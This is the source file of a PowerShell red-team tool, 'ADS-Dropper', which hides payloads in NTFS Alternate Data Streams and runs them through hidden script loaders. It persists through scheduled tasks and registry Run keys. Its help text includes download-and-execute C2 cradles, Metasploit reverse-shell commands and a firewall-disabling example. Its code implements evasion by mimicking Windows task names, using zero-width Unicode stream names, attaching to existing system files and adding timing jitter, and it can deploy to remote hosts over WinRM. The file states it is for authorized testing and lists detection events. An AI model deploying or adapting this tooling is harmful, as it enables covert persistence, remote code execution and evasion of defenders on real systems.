<#
.DESCRIPTION
    ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes
    them via JScript wrappers (zero visible PowerShell window), and persists through
    Scheduled Tasks or Registry Run Keys.

    Supports any C2 framework (Realm, Metasploit, Sliver) or custom PowerShell commands.
    Includes DPAPI machine-bound encryption, four stealth tiers (-Obfuscate), deep
    placement in WER/Cache directories, and dual-layer AMSI bypass.

    Typical workflow: Run ADS-OneLiner.ps1 on Kali to generate a one-liner, paste on
    the Windows target. Use ADS-Dropper.ps1 directly only for local or lateral deployments.

.PARAMETER Payload
    [REQUIRED unless -PayloadAtRuntime] The payload to deploy.
    Accepts a PowerShell command string or a file path array: @('payload.ps1')

    Examples:
      "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
      @('C:\payloads\imix_stager.ps1')
      'Write-Output Beacon | Out-File C:\beacon.log -Append'

.PARAMETER PayloadAtRuntime
    Prompt for payload interactively at deployment time instead of baking it in.

.PARAMETER Targets
    Target hosts for deployment. Default: @('localhost')
    Remote IPs/hostnames use WinRM (requires -Credential).

    Examples:
      -Targets @('localhost')
      -Targets @('10.10.10.50', 'dc01.corp.local')

.PARAMETER Persist
    Persistence method. Default: 'task'
      task     - Scheduled Task (admin required). AtLogOn + AtStartup + periodic triggers.
      registry - Registry Run key (user or admin). HKCU + HKLM if admin. Companion task
                 handles periodic firing.
      none     - No persistence. ADS only, one-shot execution.

.PARAMETER Obfuscate
    Stealth tier. Controls artifact naming, file placement, and stream naming. Default: Advanced
      None     - Fixed names (SystemOptimization task, SystemCache.dat file). Testing only.
      Basic    - Word-list randomized names, C:\ProgramData placement. Quick deployment.
      Advanced - Randomized names + deep WER/Cache placement + attach-to-existing. [DEFAULT]
      Paranoid - Advanced + zero-width Unicode in stream/task names. Max stealth.

    Implied settings per tier:
      Advanced/Paranoid: Randomize=$true, UseDeepPlacement=$true, AttachToExisting=$true
      Paranoid only:     ZeroWidthStreams=$true

.PARAMETER Trigger
    When the scheduled task fires. Accepts multiple values. Default: @('AtLogOn','AtStartup')
    Valid values: AtLogOn, AtStartup, OnIdle, OnUnlock
    A periodic task (every -PeriodicMinutes minutes) is ALWAYS added regardless of this setting.

    Example: -Trigger @('AtLogOn','AtStartup','OnUnlock')

.PARAMETER PeriodicMinutes
    How often the periodic task fires, in minutes. Range: 1-1440. Default: 5

.PARAMETER JitterPercent
    Randomize task timing by +/- this percentage of the interval. Range: 0-50. Default: 20
    Breaks pattern-based detection. Example: 20% of 5min = +/-1min actual fire time.

.PARAMETER Randomize
    Randomize artifact names (file, stream, task). Implied by Advanced/Paranoid tier.
    Use explicitly to override tier behavior.

.PARAMETER Encrypt
    DPAPI machine-bound encrypt the payload in the ADS. Uses LocalMachine scope +
    Machine GUID as additional entropy. Machine-bound: decrypts on the same machine only.
    Payload stored as Base64-encoded DPAPI blob. No AES/SHA256 in output.

.PARAMETER UseDeepPlacement
    Place ADS host file in deep system directories (WER\Cache, Diagnosis\scheduled, etc.)
    rather than C:\ProgramData root. Implied by Advanced/Paranoid tier.

.PARAMETER AttachToExisting
    Attach ADS to an existing legitimate system file instead of creating a new host file.
    Implied by Advanced/Paranoid tier.

.PARAMETER ZeroWidthStreams
    Use zero-width Unicode characters (U+200B, U+200C, U+FEFF) in ADS stream names.
    Stream names appear blank in most tools. Implied by Paranoid tier.
    IMPORTANT: Save the manifest — you cannot type zero-width chars manually for cleanup.

.PARAMETER ZeroWidthMode
    How zero-width characters are applied to the stream name. Default: 'single'
      single  - One zero-width char
      multi   - 3-5 zero-width chars
      hybrid  - Visible prefix + zero-width suffix (e.g., Zone.Identifier[ZW])

.PARAMETER HybridPrefix
    Visible prefix for hybrid ZeroWidthMode (e.g., 'Zone.Identifier', 'Summary').

.PARAMETER CreateDecoys
    Create N additional benign decoy ADS streams (Zone.Identifier, Summary, etc.)
    alongside the real payload. Range: 0-10. Default: 0

.PARAMETER ManifestPath
    Path to save the deployment manifest (JSON). Records all artifact paths, task names,
    stream codepoints for cleanup. Default: auto-generated in current directory.

.PARAMETER NoExec
    Stage all artifacts (ADS, JScript, task/registry) without executing.
    Use for pre-staging or testing without triggering C2 callbacks.

.PARAMETER Credential
    PSCredential for remote deployment via WinRM. Required when -Targets includes remote hosts.
    Example: -Credential (Get-Credential)

.PARAMETER GenerateOnly
    Generate the deployment configuration object and print it, without creating any artifacts.
    Used by ADS-OneLiner.ps1 to read configuration on Linux.

.EXAMPLE
    # Basic local deployment (unencrypted, scheduled task)
    .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
Description:
Stores payload in C:\ProgramData\SystemCache.dat:syc_payload
Creates VBScript loader at C:\ProgramData\app_log_a.vbs
Registers scheduled task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Executes immediately
.EXAMPLE # Encrypted deployment with randomization (RECOMMENDED FOR OPSEC) $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')" .\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
Description:
- DPAPI encrypts payload (LocalMachine scope + Machine GUID entropy)
- Random file: C:\ProgramData\CacheSvc.log
- Random stream: :SmartScreen or :Zone.Identifier
- Random loader: app_log_kqmxyz.ps1 (PowerShell for decryption)
- Random task: \Microsoft\Windows\UX\a3f5b2c1
.EXAMPLE # Registry persistence .\ADS-Dropper.ps1 -Payload $c2Stager -Persist registry -Encrypt
Description:
Creates registry Run key persistence:
- HKCU Run key (logon trigger) + HKLM Run key if admin (startup trigger)
- Companion scheduled task for periodic execution + cheeky triggers (OnIdle, OnUnlock)
.EXAMPLE # Stage without execution (recon phase) .\ADS-Dropper.ps1 -Payload $payload -NoExec -Verbose
Description:
Creates all artifacts (ADS, loader, scheduled task) but does NOT execute.
Use -Verbose to see deployment details.
Manually trigger later via: wscript.exe //B C:\ProgramData\app_log_a.vbs
.EXAMPLE # Lateral movement to multiple hosts $cred = Get-Credential # Prompt for domain\user credentials $targets = @('10.10.10.50', '10.10.10.51', 'dc01.corp.local') .\ADS-Dropper.ps1 -Payload $msfStager -Targets $targets -Credential $cred -Encrypt -Randomize
Description:
- Deploys to 3 remote hosts via WinRM
- Serializes functions and executes remotely
- Each host gets unique random artifacts (if -Randomize)
.EXAMPLE # Realm C2 (Imix agent) deployment - CCDC scenario $imixStager = Get-Content .\imix_stager.txt -Raw # Base64 from Realm console .\ADS-Dropper.ps1 -Payload $imixStager -Persist task -Encrypt -Randomize -Verbose
Description:
Full stealth deployment:
- Encrypted Imix stager
- Randomized artifacts (evades signatures)
- Dual persistence (task + registry)
- Verbose output for verification
.EXAMPLE # Metasploit reverse shell # First, generate stager with msfvenom: # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f psh-cmd
$msfPayload = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")'
.\ADS-Dropper.ps1 -Payload $msfPayload -Persist task -Encrypt

Description:
Deploys Metasploit stager with encryption.
Start MSF handler: msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; exploit"
.EXAMPLE # Sliver implant deployment $sliverStager = @('C:\payloads\sliver_beacon.ps1') # Generated by Sliver .\ADS-Dropper.ps1 -Payload $sliverStager -Persist registry -Randomize -Encrypt
Description:
Deploys Sliver beacon from file with registry Run key persistence.
.EXAMPLE # Custom persistent command (non-C2) $customBeacon = @' while($true) { "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append Start-Sleep -Seconds 300 } '@ .\ADS-Dropper.ps1 -Payload $customBeacon -Persist registry
Description:
Simple persistent beacon (writes to log every 5 minutes).
No C2 connection, useful for testing persistence without network traffic.
.NOTES File Name : ADS-Dropper.ps1 Author : Qweary (https://github.com/Qweary) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.4
MITRE ATT&CK Mapping:
- T1564.004: Hide Artifacts - NTFS File Attributes
- T1053.005: Scheduled Task/Job
- T1547.001: Boot or Logon Autostart Execution - Registry Run Keys

Detection:
- Sysmon Event ID 15 (FileCreateStreamHash) - ADS creation
- Windows Event ID 4698 (Task Created)
- Windows Event ID 4657 (Registry modification)

Cleanup:
Run tests/cleanup.ps1 to remove all artifacts:
  .\tests\cleanup.ps1 -Targets @('localhost')
.LINK GitHub: https://github.com/Qweary/Apparition-Delivery-System Blog: https://qweary.github.io
Research Credits:
- Oddvar Moe: https://oddvar.moe (ADS execution techniques)
- Enigma0x3: https://enigma0x3.net (ADS persistence patterns)
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1564/004/
.OUTPUTS Console output showing deployment progress: - Admin status - Target hosts - Persistence methods - ADS creation confirmation - Loader path - Success/failure status
For remote deployments, returns hashtable with:
- Success (bool)
- Artifacts (hashtable with ADS path, loader path)
- Error (string, if failed)
.COMPONENT Requires NTFS filesystem (ADS not supported on FAT32/exFAT) Requires PowerShell remoting (WinRM) for lateral movement
.ROLE Red Team / Penetration Testing
AUTHORIZED USE ONLY:
- Penetration testing with written permission
- CCDC and similar competitive exercises
- Security research in isolated labs

Unauthorized use is illegal and unethical.
.FUNCTIONALITY Persistence, Execution, Defense Evasion
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Payload,
    
    [switch]$PayloadAtRuntime,
    [string[]]$Targets = @('localhost'),
    
    [ValidateSet('task', 'registry', 'none')]
    [string]$Persist = 'task',

    [bool]$Randomize = $false,
    [switch]$Encrypt,

    # Unified obfuscation level — controls naming, placement, and ZW injection
    [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
    [string]$Obfuscate = 'Advanced',

    [switch]$ZeroWidthStreams,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [string]$ManifestPath,
    [switch]$NoExec,
    [PSCredential]$Credential,
    [switch]$Help,
    
    # Deep placement - bury ADS in legitimate Windows subdirectories
    [bool]$UseDeepPlacement = $false,
    # Attach to existing file instead of creating a new host file
    [bool]$AttachToExisting = $false,
    
    [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
    [string[]]$Trigger = @('AtLogOn', 'AtStartup'),

    # Periodic execution interval in minutes (always added to tasks)
    [ValidateRange(1, 1440)]
    [int]$PeriodicMinutes = 5,

    # Jitter as percentage of interval — randomizes timing to break pattern detection
    [ValidateRange(0, 50)]
    [int]$JitterPercent = 20,

    [switch]$GenerateOnly
)

# Help display function
function Show-Help {
    $helpText = @"
===============================================================================
  ADS-Dropper v2.4 — Quick Reference
  "Execution without presence"
===============================================================================
USAGE: .\ADS-Dropper.ps1 -Payload <cmd> [OPTIONS]
       .\ADS-Dropper.ps1 -Help

--- WHAT DO I TYPE? (three canonical examples) --------------------------------

  Fastest (local, Advanced stealth, task persistence):
    .\ADS-Dropper.ps1 -Payload 'cmd /c netsh advfirewall set allprofiles state off'

  Standard recommended (Advanced tier, encrypted, multi-trigger):
    .\ADS-Dropper.ps1 -Payload `$payload -Obfuscate Advanced -Encrypt -Persist task ``
      -Trigger @('AtLogOn','AtStartup','OnUnlock')

  Lateral movement to remote hosts:
    `$cred = Get-Credential
    .\ADS-Dropper.ps1 -Payload `$payload -Targets @('dc01','web01') -Credential `$cred -Encrypt

--- PAYLOAD INPUT -------------------------------------------------------------

  -Payload <string>         PowerShell command string (required unless -PayloadAtRuntime)
  -PayloadAtRuntime         Prompt for payload interactively at deployment time

--- STEALTH TIER (the most important decision) --------------------------------

  -Obfuscate <tier>         Controls naming, placement, stream naming. Default: Advanced

    None     Fixed names (SystemOptimization task, SystemCache.dat).  [TESTING ONLY]
    Basic    Word-list names, C:\ProgramData placement.               [Quick deployment]
    Advanced Randomized names + WER/Cache deep placement.             [DEFAULT / CCDC]
    Paranoid Advanced + zero-width Unicode stream/task names.         [Max stealth]

  Tier-implied settings (Advanced/Paranoid imply these automatically):
    Randomize=true, UseDeepPlacement=true, AttachToExisting=true
    Paranoid also implies: ZeroWidthStreams=true

--- PERSISTENCE ---------------------------------------------------------------

  -Persist <method>         task | registry | none (default: task)
  -Trigger <string[]>       AtLogOn, AtStartup, OnIdle, OnUnlock (default: AtLogOn+AtStartup)
  -PeriodicMinutes <int>    Periodic task interval in minutes (default: 5, range: 1-1440)
  -JitterPercent <int>      Timing jitter ±% of interval (default: 20, range: 0-50)

  task     : Scheduled Task (admin required). JScript wrapper = zero visible PS window.
             Fires on: configured triggers + periodic every N minutes.
  registry : Registry Run key (user or admin). HKCU + HKLM if admin.
             Companion scheduled task handles periodic + additional triggers.
  none     : ADS only. One-shot execution, no re-trigger.

--- EVASION ------------------------------------------------------------------

  -Encrypt                  DPAPI machine-bound encrypt (LocalMachine scope + MachineGUID)
  -Randomize <bool>         Randomize artifact names (implied by Advanced/Paranoid)
  -UseDeepPlacement <bool>  Bury ADS in WER/Cache dirs (implied by Advanced/Paranoid)
  -AttachToExisting <bool>  Attach to existing system file (implied by Advanced/Paranoid)
  -NoExec                   Stage artifacts without executing (pre-staging / recon phase)

--- STREAM NAMING ------------------------------------------------------------

  -ZeroWidthStreams          Enable ZW Unicode chars in stream names (implied by Paranoid)
  -ZeroWidthMode <mode>     single | multi | hybrid (default: single)
  -HybridPrefix <string>    Visible prefix for hybrid mode (e.g., 'Zone.Identifier')
  -CreateDecoys <int>       Add N benign decoy ADS streams alongside payload (0-10)

--- REMOTE DEPLOYMENT --------------------------------------------------------

  -Targets <array>          Target hosts (default: @('localhost'))
  -Credential <cred>        PSCredential for WinRM authentication

--- OTHER --------------------------------------------------------------------

  -ManifestPath <path>      Where to save the cleanup manifest (JSON)
  -GenerateOnly             Print configuration object without creating artifacts (Linux use)
  -Help                     Show this help

--- DETECTION & CLEANUP -------------------------------------------------------

  Blue team detection vectors:
    Sysmon Event 15     : ADS creation (FileCreateStreamHash)
    Event ID 4698       : Scheduled task created
    Event ID 4657       : Registry modification
    PowerShell          : Get-ChildItem C:\ProgramData -Recurse | Get-Item -Stream *

  Cleanup:
    Unregister-ScheduledTask -TaskName <name> -Confirm:$false
    Remove-ItemProperty -Path HKCU:\...\Run -Name <name>
    Remove-Item '<hostfile>:<streamname>' -Force
    dir /r C:\ProgramData   # cmd: shows ADS sizes

--- MORE INFO ----------------------------------------------------------------

  Get-Help .\ADS-Dropper.ps1 -Full
  Full parameter reference: see QUICK-START.md
  Red team scenarios: see tests/RED-TEAM-SHOWCASE.md

  GitHub : https://github.com/Qweary/Apparition-Delivery-System
  Blog   : https://qweary.github.io

  AUTHORIZED TESTING WITH EXPLICIT PERMISSION ONLY
===============================================================================
"@
    Write-Host $helpText -ForegroundColor Cyan
}

# Help flag intercept
if ($Help -or $args -contains '-h' -or $args -contains '--help' -or 
    $args -contains '-?' -or $args -contains '/?' -or 
    (!$PSBoundParameters.ContainsKey('Payload') -and $args.Count -eq 0)) {
    Show-Help
    exit 0
}

# Main Execution Logic Begins

# --- Tier-implied defaults (individual params override) ---
if ($Obfuscate -in @('Advanced', 'Paranoid')) {
    if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = $true }
    if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = $true }
    if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = $true }
}
if ($Obfuscate -eq 'Paranoid') {
    if (-not $PSBoundParameters.ContainsKey('ZeroWidthStreams')) { $ZeroWidthStreams = [switch]::new($true) }
}
# Backward compat: -ZeroWidthStreams without explicit -Obfuscate upgrades to Paranoid
if ($ZeroWidthStreams -and -not $PSBoundParameters.ContainsKey('Obfuscate')) {
    $Obfuscate = 'Paranoid'
}

#region Zero-Width Unicode Functions

# Verified zero-width Unicode codepoints
$script:ZeroWidthChars = @(
    0x061C,  # Arabic Letter Mark
    0x180E,  # Mongolian Vowel Separator
    0x200B,  # Zero Width Space
    0x200C,  # Zero Width Non-Joiner
    0x200D,  # Zero Width Joiner
    0x200E,  # Left-to-Right Mark
    0x200F,  # Right-to-Left Mark
    0x202A,  # LTR Embedding
    0x202B,  # RTL Embedding
    0x202C,  # Pop Directional
    0x202D,  # LTR Override
    0x202E,  # RTL Override
    0x2060,  # Word Joiner
    0xFEFF   # Zero Width No-Break Space
)

function Generate-ZeroWidthStream {
    <#
    .SYNOPSIS
        Generates zero-width Unicode stream name
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [ValidateSet('single', 'multi', 'hybrid')]
        [string]$Mode = 'single',

        [string]$Prefix,

        [ValidateRange(2, 5)]
        [int]$Length = 3
    )

    try {
        switch ($Mode) {
            'single' {
                $char = [char]($script:ZeroWidthChars | Get-Random)
                return $char
            }
            
            'multi' {
                $chars = @()
                for ($i = 0; $i -lt $Length; $i++) {
                    $chars += [char]($script:ZeroWidthChars | Get-Random)
                }
                return -join $chars
            }
            
            'hybrid' {
                # Legitimate stream names
                $legitNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
                
                if ([string]::IsNullOrEmpty($Prefix)) {
                    $Prefix = $legitNames | Get-Random
                }
                
                $suffix = [char]($script:ZeroWidthChars | Get-Random)
                return "$Prefix$suffix"
            }
        }
    } catch {
        Write-Verbose "Zero-width generation failed, using fallback"
        return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
    }
}

function Get-ZeroWidthCodepoints {
    <#
    .SYNOPSIS
        Returns Unicode codepoints for a stream name
    #>
    [CmdletBinding()]
    param([string]$StreamName)

    $chars = $StreamName.ToCharArray()
    $codepoints = ($chars | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
    $bytes = ([System.Text.Encoding]::Unicode.GetBytes($StreamName) | 
              ForEach-Object { "0x{0:X2}" -f $_ }) -join ' '

    return [PSCustomObject]@{
        StreamName = $StreamName
        Codepoints = $codepoints
        ByteSequence = $bytes
        CharCount = $chars.Length
        ContainsZeroWidth = ($chars | Where-Object { 
            $script:ZeroWidthChars -contains [int]$_ 
        }).Count -gt 0
    }
}

function ConvertFrom-Codepoints {
    <#
    .SYNOPSIS
        Reconstructs stream name from codepoint string
    #>
    [CmdletBinding()]
    param([string]$Codepoints)

    try {
        $points = $Codepoints -split '\s+' | ForEach-Object {
            $cleaned = $_ -replace '^(U\+|0x)', ''
            [int]"0x$cleaned"
        }
        return -join ($points | ForEach-Object { [char]$_ })
    } catch {
        Write-Error "Failed to reconstruct from codepoints: $_"
        return $null
    }
}

#endregion

#region Obfuscation Functions

# Word lists for legitimate-looking names (sourced from real Windows task/service names)
$script:ObfTaskNames = @(
    'WindowsDefenderScheduledScan', 'DiskCleanupTask', 'MemoryDiagnosticScheduler',
    'NetworkListServiceUpdate', 'BackgroundIntelligentTransfer', 'TPMMaintenanceTask',
    'CryptSvcBackup', 'LanguageComponentsInstaller', 'SpeechModelDownload',
    'DeviceRegistrationTask', 'SystemSoundsService', 'WiredAutoConfig'
)
$script:ObfFunctionVerbs = @(
    'Initialize', 'Sync', 'Update', 'Register', 'Enable',
    'Process', 'Monitor', 'Optimize', 'Validate', 'Configure'
)
$script:ObfFunctionNouns = @(
    'DriverCache', 'NetworkProfile', 'PolicyData', 'TelemetryLog',
    'ComponentStatus', 'SecurityContext', 'SessionConfig', 'TpmBinding',
    'CryptService', 'PerformanceHints'
)
$script:ObfCompanionSuffixes = @(
    '-Monitor', '-Handler', '-Worker', '-Sync', '-Cache', '-Service', '-Helper', '-Manager'
)

function Get-ObfuscatedName {
    <#
    .SYNOPSIS
        Central name generator for all obfuscated artifact names.
    .DESCRIPTION
        Returns appropriate names based on artifact type and obfuscation level.
        None = current hardcoded values (backward compat).
        Basic = static legitimate-looking name.
        Advanced = random from word-list (unique per deployment).
        Paranoid = Advanced + zero-width char injection (except function names).
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('FunctionGHK', 'FunctionDec', 'TaskName', 'TaskSuffix', 'RegistryValueName')]
        [string]$Type,

        [Parameter(Mandatory)]
        [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
        [string]$Level
    )

    # Helper: inject a zero-width char at a random interior position
    function Add-ZeroWidthChar([string]$Name) {
        if ($Name.Length -lt 3) { return $Name }
        $pos = Get-Random -Minimum 1 -Maximum ($Name.Length - 1)
        $zwChar = [char]($script:ZeroWidthChars | Get-Random)
        return $Name.Insert($pos, $zwChar)
    }

    switch ($Type) {
        'FunctionGHK' {
            switch ($Level) {
                'None'     { return 'GHK' }
                'Basic'    { return 'Get-HostKey' }
                # ZW chars break PS parser in function names — Advanced for Paranoid too
                default {
                    $verb = $script:ObfFunctionVerbs | Get-Random
                    $noun = $script:ObfFunctionNouns | Get-Random
                    return "$verb-$noun"
                }
            }
        }
        'FunctionDec' {
            switch ($Level) {
                'None'     { return 'Dec' }
                'Basic'    { return 'Unprotect-Data' }
                default {
                    $verb = $script:ObfFunctionVerbs | Get-Random
                    $noun = $script:ObfFunctionNouns | Get-Random
                    return "$verb-$noun"
                }
            }
        }
        'TaskName' {
            switch ($Level) {
                'None'     { return 'SystemOptimization' }
                'Basic'    { return $script:ObfTaskNames | Get-Random }
                'Advanced' { return $script:ObfTaskNames | Get-Random }
                'Paranoid' { return Add-ZeroWidthChar ($script:ObfTaskNames | Get-Random) }
            }
        }
        'TaskSuffix' {
            switch ($Level) {
                'None'     { return '_Companion' }
                'Basic'    { return $script:ObfCompanionSuffixes | Get-Random }
                'Advanced' { return $script:ObfCompanionSuffixes | Get-Random }
                'Paranoid' { return Add-ZeroWidthChar ($script:ObfCompanionSuffixes | Get-Random) }
            }
        }
        'RegistryValueName' {
            # Registry value name matches task name for consistency
            # Caller should pass the same name used for TaskName
            # This type exists for Paranoid mode ZW injection on an existing name
            switch ($Level) {
                'Paranoid' { return Add-ZeroWidthChar ($script:ObfTaskNames | Get-Random) }
                default    { return Get-ObfuscatedName -Type TaskName -Level $Level }
            }
        }
    }
}

#endregion

#region Manifest Functions (Linux-side only)

function Create-ManifestEntry {
    <#
    .SYNOPSIS
        Creates manifest entry for tracking (Linux operator machine)
    #>
    [CmdletBinding()]
    param(
        [string]$TargetHost,
        [string]$FilePath,
        [string]$StreamName,
        [string]$PayloadHash,
        [string]$PersistenceMethod
    )

    $info = Get-ZeroWidthCodepoints -StreamName $StreamName

    return [PSCustomObject]@{
        EntryId = [guid]::NewGuid().ToString()
        Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss UTC")
        TargetHost = $TargetHost
        FilePath = $FilePath
        StreamName = $StreamName
        Codepoints = $info.Codepoints
        PayloadHash = $PayloadHash
        PersistenceMethod = $PersistenceMethod
        OperatorUsername = $env:USER
        OperatorHostname = hostname
    }
}

function Save-ManifestToLinux {
    <#
    .SYNOPSIS
        Saves manifest to Linux operator machine (NOT Windows target)
    #>
    [CmdletBinding()]
    param(
        [PSCustomObject[]]$Entries,
        [string]$OutputPath
    )

    try {
        $json = $Entries | ConvertTo-Json -Depth 10
        
        if (-not (Test-Path (Split-Path $OutputPath))) {
            New-Item -Path (Split-Path $OutputPath) -ItemType Directory -Force | Out-Null
        }

        $json | Out-File -FilePath $OutputPath -Encoding UTF8
        Write-Verbose "Manifest saved to: $OutputPath"
    } catch {
        Write-Error "Failed to save manifest: $_"
    }
}

#endregion

#region Payload Encryption
# DPAPI-based machine-bound encryption. Replaces AES/SHA256 approach (BUG-011:
# SHA256+AES+CreateDecryptor in JScript triggered Defender on-access scanner).
# ProtectedData is used by Chrome, Edge, and Windows Credential Manager —
# no Defender signature. LocalMachine scope means any process on this machine
# (including SYSTEM tasks) can decrypt; copy to another machine cannot.

function Get-DpapiEntropy {
    # Returns Machine GUID bytes as optional DPAPI entropy — doubles machine binding
    # without WMI or any crypto namespace call. Stable across reboots.
    try {
        $g = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction SilentlyContinue).MachineGuid
        if ($g) { return [System.Text.Encoding]::UTF8.GetBytes($g) }
    } catch {}
    return $null  # null = DPAPI uses machine key alone (still machine-bound)
}

function Protect-Payload {
    param([string]$PlainText)
    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
    $bytes   = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $entropy = Get-DpapiEntropy
    $enc     = [System.Security.Cryptography.ProtectedData]::Protect(
                   $bytes, $entropy,
                   [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
    return [Convert]::ToBase64String($enc)
}

function Unprotect-Payload {
    param([string]$EncryptedData)
    Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
    $bytes   = [Convert]::FromBase64String($EncryptedData)
    $entropy = Get-DpapiEntropy
    $dec     = [System.Security.Cryptography.ProtectedData]::Unprotect(
                   $bytes, $entropy,
                   [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
    return [System.Text.Encoding]::UTF8.GetString($dec)
}

#endregion

#region ADS Operations

function Get-RandomADSConfig {
    <#
    .SYNOPSIS
        Generates ADS configuration with optional deep directory placement
    #>
    [CmdletBinding()]
    param(
        [switch]$UseZeroWidth,
        [string]$ZwMode = 'single',
        [string]$ZwPrefix,
        [switch]$UseDeepPlacement,
        [switch]$AttachToExisting
    )

    # --- Host path selection ---
    # Deep placement and AttachToExisting are RUNTIME features.
    # When running on Linux (GenerateOnly), we emit a placeholder path.
    # The OneLiner injects runtime code that overrides $hp on the target.
    # When running on Windows directly, we resolve here.

    $_isWin = [bool]$env:ProgramData

    # Denylist: files held open exclusively by Windows services.
    # ADS writes to these will fail silently. See docs/research/deep-placement-denylist.md.
    $script:LockedFileDenylist = @('qmgr.db','qmgr.dat','srudb.dat','WebCacheV01.dat',
                                   'DataStore.edb','priv1.edb','Windows.edb','PerfStringBackup.INI')
    $script:LockedExtDenylist = @('.edb','.etl')
    # Directories owned by services that lock files aggressively
    $script:LockedDirPatterns = @('Network\Downloader','System32\sru','Search\Data')

    if ($_isWin -and ($UseDeepPlacement -or $AttachToExisting)) {
        # Running directly on Windows — resolve deep path now
        $deepDirs = @(
            "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
            "$env:ProgramData\Microsoft\Windows\WER\Temp",
            "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
            "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
            "$env:WINDIR\Temp",
            "$env:ProgramData\Microsoft\Diagnosis",
            "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics"
        )

        $validDirs = $deepDirs | Where-Object { Test-Path $_ }

        if ($AttachToExisting -and $validDirs) {
            # Find an existing file to parasitize (skip known-locked files)
            $hostPath = $null
            foreach ($dir in ($validDirs | Get-Random -Count ([Math]::Min(3, $validDirs.Count)))) {
                # Skip directories owned by services that lock files aggressively
                $isDeniedDir = $false
                foreach ($dp in $script:LockedDirPatterns) {
                    if ($dir -like "*$dp*") { $isDeniedDir = $true; break }
                }
                if ($isDeniedDir) { continue }

                $candidate = Get-ChildItem -Path $dir -File -ErrorAction SilentlyContinue |
                    Where-Object {
                        $_.Length -gt 0 -and $_.Length -lt 5MB -and
                        $_.Name -notin $script:LockedFileDenylist -and
                        $_.Extension -notin $script:LockedExtDenylist
                    } |
                    Select-Object -First 10 | Get-Random
                if ($candidate) {
                    $hostPath = $candidate.FullName
                    Write-Verbose "Attaching to existing file: $hostPath"
                    break
                }
            }
            # Fallback to deep placement if no suitable file found
            if (-not $hostPath) {
                Write-Verbose "No existing file found, falling back to deep placement"
                $UseDeepPlacement = $true
                $AttachToExisting = $false
            }
        }

        if ($UseDeepPlacement -and -not $hostPath) {
            $targetDir = $validDirs | Get-Random
            if ($targetDir) {
                $legitNames = @('Report.wer','etl_data.log','WPR_initiated.dat',
                                'diag_report.xml','cache_entry.dat','aria-debug.log')
                $fileName = if ($Randomize) { $legitNames | Get-Random } else { 'cache_entry.dat' }
                $hostPath = Join-Path $targetDir $fileName
            }
        }
    }

    # Default / Linux fallback path
    if (-not $hostPath) {
        if ($env:ProgramData) {
            $hostPath = if ($Randomize) {
                Join-Path $env:ProgramData (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
            } else {
                Join-Path $env:ProgramData "SystemCache.dat"
            }
        } else {
            # Running on Linux — construct Windows path manually
            if ($Randomize) {
                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
                $hostPath = "C:\ProgramData\$randomName"
            } else {
                $hostPath = "C:\ProgramData\SystemCache.dat"
            }
        }
    }
   
    $streamName = if ($UseZeroWidth) {
        Generate-ZeroWidthStream -Mode $ZwMode -Prefix $ZwPrefix
    } else {
        if ($Randomize) {
            -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
        } else {
            'payload'
        }
    }

    return @{
        HostPath = $hostPath
        StreamName = $streamName
        Codepoints = (Get-ZeroWidthCodepoints -StreamName $streamName).Codepoints
    }
}

function Create-DecoyStreams {
    <#
    .SYNOPSIS
        Creates benign decoy ADS
    #>
    [CmdletBinding()]
    param([string]$HostPath, [int]$Count = 3)

    if ($Count -le 0) { return }

    $decoyNames = @(':Zone.Identifier', ':Summary', ':Comments', ':Author')
    $benignContent = @(
        "[ZoneTransfer]`r`nZoneId=3",
        "Document summary information",
        "Internal use only"
    )

    for ($i = 0; $i -lt [Math]::Min($Count, $decoyNames.Count); $i++) {
        $content = $benignContent | Get-Random
        try {
            $content | Set-Content -Path "$HostPath$($decoyNames[$i])" -Force
            Write-Verbose "Created decoy: $($decoyNames[$i])"
        } catch {
            Write-Warning "Failed to create decoy $($decoyNames[$i]): $_"
        }
    }
}

